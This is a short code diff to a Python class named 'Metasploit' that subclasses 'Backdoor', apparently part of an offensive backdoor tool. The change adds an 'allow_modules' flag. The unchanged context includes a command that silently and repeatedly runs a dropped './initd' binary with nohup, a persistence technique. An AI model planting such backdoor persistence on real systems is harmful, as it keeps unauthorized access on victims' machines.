@@ -19,7 +19,8 @@ class Metasploit(Backdoor):
                 }
         self.enabled_modules = {}
         self.modules = {} 
-        self.command = "watch -n1 nohup ./initd > /dev/null" 
+        self.command = "watch -n1 nohup ./initd > /dev/null"
+        self.allow_modules = True
     def get_value(self, name):
         if name in self.options:
             return self.options[name].value
